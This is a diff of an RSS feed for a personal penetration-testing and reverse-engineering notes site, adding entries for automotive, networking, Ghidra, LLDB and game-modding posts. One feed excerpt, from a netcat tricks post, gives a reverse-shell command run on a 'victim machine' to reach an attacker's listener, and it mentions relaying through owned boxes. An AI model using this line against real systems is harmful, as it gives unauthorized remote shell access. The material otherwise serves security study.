@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Posts on </title>
+    <title>Posts on duraki&#39;s notes</title>
     <link>https://duraki.github.io/notes/public/posts/</link>
-    <description>Recent content in Posts on </description>
+    <description>Recent content in Posts on duraki&#39;s notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>durakiconsulting (c) h. duraki</copyright><atom:link href="https://duraki.github.io/notes/public/posts/index.xml" rel="self" type="application/rss+xml" />
@@ -48,6 +48,15 @@ Using openssl is recommended way to convert DER to PEM format.</description>
     </item>
     
     <item>
+      <title>Automotive</title>
+      <link>https://duraki.github.io/notes/public/automotive/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://duraki.github.io/notes/public/automotive/</guid>
+      <description> Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  </description>
+    </item>
+    
+    <item>
       <title>Automotive Cybersecurity Videos</title>
       <link>https://duraki.github.io/notes/public/automotive-cybersecurity-videos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -85,6 +94,16 @@ The second statement combines:
       <guid>https://duraki.github.io/notes/public/blog-setup/</guid>
       <description>The blog is using a custom site generator called art and it uses Ruby and some wrapper magic to generate this from a rather minimal configuration setup in .home.yml file.
 --- minimal: artist: &amp;#34;Your Name&amp;#34; title: &amp;#34;Blog Title&amp;#34; description: &amp;#34;Blog description.&amp;#34; theme: &amp;#34;theme-name&amp;#34; posts: in: /posts/in # =&amp;gt; post in (md) out: /posts/out # =&amp;gt; post out (html) scripts: - &amp;#34;my super href:/about/me.html&amp;#34; # =&amp;gt; Links/URIs/Other art: ga: UA-00000000-X # =&amp;gt; your Google Analytics </description>
+    </item>
+    
+    <item>
+      <title>Building Kali Linux for Banana Pro</title>
+      <link>https://duraki.github.io/notes/public/building-kali-linux-for-banana-pro/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://duraki.github.io/notes/public/building-kali-linux-for-banana-pro/</guid>
+      <description>Equipment  MacOS with GNU/Linux Virtual Machine or GNU/Linux equivalent LeMaker Banana Pro arm_pc SDCard with at least 16GB capacity (preferably &amp;ldquo;Class 10&amp;rdquo; or higher)  Build Instructions The Banana Pro has a dual core 1GHz Cortex™-A7 processor with a Mali400MP2 GPU and 1GB DDR3 RAM. Kali Linux can run from an external microSD card.
+Kali Linux is supporting Banana Pro but it must be built from source. You will obviously need a GNU/Linux based OS (preferably Kali Linux) &amp;ndash; although I personally use VMWare Workstation with Ubuntu 20.</description>
     </item>
     
     <item>
@@ -144,6 +163,15 @@ RULE trace thread start CLASS java.</description>
     </item>
     
     <item>
+      <title>Classical</title>
+      <link>https://duraki.github.io/notes/public/classical/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://duraki.github.io/notes/public/classical/</guid>
+      <description> OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse  </description>
+    </item>
+    
+    <item>
       <title>Classical API Abuse</title>
       <link>https://duraki.github.io/notes/public/classical-api-abuse/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -185,6 +213,15 @@ Syslog Macros
       <guid>https://duraki.github.io/notes/public/decrypt-ipa-from-appstore/</guid>
       <description>Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.
 # =&amp;gt; Start iproxy $ iproxy 2222 22 # =&amp;gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =&amp;gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ... </description>
+    </item>
+    
+    <item>
+      <title>Dev</title>
+      <link>https://duraki.github.io/notes/public/dev/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://duraki.github.io/notes/public/dev/</guid>
+      <description> Bash  </description>
     </item>
     
     <item>
@@ -245,6 +282,16 @@ $ adb devices -l $ frida-ps -U # PID NAME 1590 com.</description>
       <description>This is quick description on how to inject Frida gadget into Smali directly without much overhead. Start by installing Frida and Objection and then continuing from here.
 First decompile the APK and check the AndroidManifest.xml file.
 $ more AndroidManifest.xml &amp;lt;application ...&amp;gt; &amp;lt;activity android:name=&amp;#34;xxx.activity.SplashActivity&amp;#34; android:noHistory=&amp;#34;true&amp;#34; android:screenOrientation=&amp;#34;portrait&amp;#34;&amp;gt; ... Write down the Activity name (such is SplashActivity). Must be somewhere on early start-up of application lifecycle. Open up the Activity in decompiled Smali object, and change the public constructor &amp;lt;init&amp;gt;(V) to include frida-gadget.</description>
+    </item>
+    
+    <item>
+      <title>Ghidra and related</title>
+      <link>https://duraki.github.io/notes/public/ghidra-and-related/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://duraki.github.io/notes/public/ghidra-and-related/</guid>
+      <description>Installation Clone the repository or download and extract somewhere. In Ghidra, open the Script Manager (Window -&amp;gt; Script Manager) click the Script Directory button and add $REPO/scripts to the list.
+Once the script directory is added to Ghidra you can find the scripts in the Script Manager. You can run the scripts directly from the Script Manager if you like but the scripts also have menus and keyboard shortcuts for ease of use.</description>
     </item>
     
     <item>
@@ -330,7 +377,7 @@ $ sudo apt-get realmd $ realm join example.ba --user username </description>
       
       <guid>https://duraki.github.io/notes/public/list-of-topics/</guid>
       <description>Personal list of topics of interest. At least for me eh? :)
-Automotive Cyber Security  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts iOS Reverse Engineering  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida &amp;amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development blog</description>
+Automotive Cyber Security §Automotive  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing §Classical Pentest  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking §Network  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering §RE  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida &amp;amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development §dev blog</description>
     </item>
     
     <item>
@@ -339,9 +386,12 @@ Automotive Cyber Security  Automotive Hacking Ethernet in Vehicles CANFD Specifi
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://duraki.github.io/notes/public/lldb/</guid>
-      <description>Attach Failed Not allowed to attach to process:
-(lldb) process attach --pid 76371 (# =&amp;gt; or by Name) error: attach failed: attach failed (Not allowed to attach to process. Look in the console messages (Console.app), near the debugserver entries, when the attach failed. The subsystem that denied the attach permission will likely have logged an informative message about why it was denied.) Solution:
-$ cat /tmp/debug_entitlements.plist &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.</description>
+      <description>Cheatsheet Objective-C Important &amp;ndash; set a lldb language context to Objective-C:
+(lldb) settings set target.language objc Cast an address to object:
+(lldb) po ((MKPinAnnotationView *)0x7df67c50).alpha &amp;hellip;
+Swift Important &amp;ndash; set a lldb language context to Swift:
+(lldb) settings set target.language swift Import a Library in the lldb context:
+# =&amp;gt; Library expr -l Swift -- import UIKit # =&amp;gt; Custom Classes expr -l Swift -- import MyTestProject expr -l Swift -- let $vc = unsafeBitCast(0x7fad22c066d0, ViewController.</description>
     </item>
     
     <item>
@@ -381,6 +431,16 @@ References:
     </item>
     
     <item>
+      <title>Modding Uplink by Introversion</title>
+      <link>https://duraki.github.io/notes/public/modding-uplink-by-introversion/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://duraki.github.io/notes/public/modding-uplink-by-introversion/</guid>
+      <description>Are you a modder? Do you want to learn how to make game modes and game hacks? You are at the right place. We will take Uplink as an example and explore various things, based on recollection of the source code. The source codes is visible at this link.
+Changing the Uplink default Font Size for HDPI On MacOS, specifically when using 2K resolution or above, either via Retina or external display; the font size of Uplink interface becomes to small to read.</description>
+    </item>
+    
+    <item>
       <title>netcat tricks</title>
       <link>https://duraki.github.io/notes/public/netcat-tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -392,6 +452,15 @@ $ sudo iptables -F $ sudo ncat -nlvp 9999 On &amp;ldquo;victim machine&amp;rdquo
 $ ncat x.x.x.x 9999 -e /bin/bash You should have a working remote shell n0w.
 For probe direct reverse shell:
 |attacker machine|&amp;lt;------&amp;gt;|attacker box|&amp;lt;-------&amp;gt;|victime machine| On &amp;ldquo;attackers box&amp;rdquo; (blackhole and/or owned boxes), drop all iptables rules (dirty), and setup a connection broker.</description>
+    </item>
+    
+    <item>
+      <title>Network</title>
+      <link>https://duraki.github.io/notes/public/network/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://duraki.github.io/notes/public/network/</guid>
+      <description> Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks  </description>
     </item>
     
     <item>
@@ -476,8 +545,17 @@ assert() create_function() eval() exec() Execution Operators (``) include() incl
       <guid>https://duraki.github.io/notes/public/pure-reverse-engineering/</guid>
       <description>Some internal knowledge have been shared here. Otherwise, check references below.
 Use Byteman to instrument compiled Java application and Jar based files. A sample script has been included in the notes.
-References
- Debugging iOS binaries with lldb Bypass Flutter SSL Pinning (2021) Frida Android Function Enumerator and Dumper  </description>
+Hopper Disassembler In case Hopper Disas is &amp;ldquo;Not Responding&amp;rdquo; due to large binary loaded you can:
+ Wait a bit more, close all unused apps, especially (Chrome) tabs Open Activity Monitor and check Hopper process details If nothing works, use the command below to purge all unused virtual memory  % purge # =&amp;gt; .</description>
+    </item>
+    
+    <item>
+      <title>RE</title>
+      <link>https://duraki.github.io/notes/public/re/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://duraki.github.io/notes/public/re/</guid>
+      <description> Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida &amp;amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida &amp;amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research [wip]  </description>
     </item>
     
     <item>
